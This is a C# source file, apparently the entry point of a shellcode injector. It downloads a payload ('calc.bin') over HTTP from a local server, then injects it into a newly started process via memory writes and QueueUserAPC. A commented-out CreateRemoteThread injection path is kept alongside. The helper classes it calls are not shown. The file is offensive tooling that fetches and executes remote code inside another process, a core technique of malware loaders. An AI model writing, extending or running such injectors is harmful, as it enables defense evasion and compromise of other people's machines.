using System;

namespace Shellcode_Injector
{
    internal class Runner
    {
 
    }
    internal class Program
    {
        static void Main()
        {
            //Initialize the class so the constructor can populate the static methods
            new WinApi();

            // Fetch shellcode
            byte[] shellcode = Helpers.Fetch("http://localhost:8080", "calc.bin");

            //var pid = 9776;
            //var phand = Helpers.GetHand(pid);

            // Standard flow -> virtualallocex, virtualprotextex, writeprocessmemory, createremotethread
            //IntPtr rmem = Helpers.MWrite(phand, shellcode);
            //Helpers.SCRun("crt", phand, rmem);


            // queue user apc flow trough creating new process
            WinApi.PIN pinfo = Helpers.StartS();
            IntPtr mem = Helpers.MWrite(pinfo.hProcess, shellcode);
            Helpers.SCRun("qua", pinfo.hThread, mem);


        }
    }
}
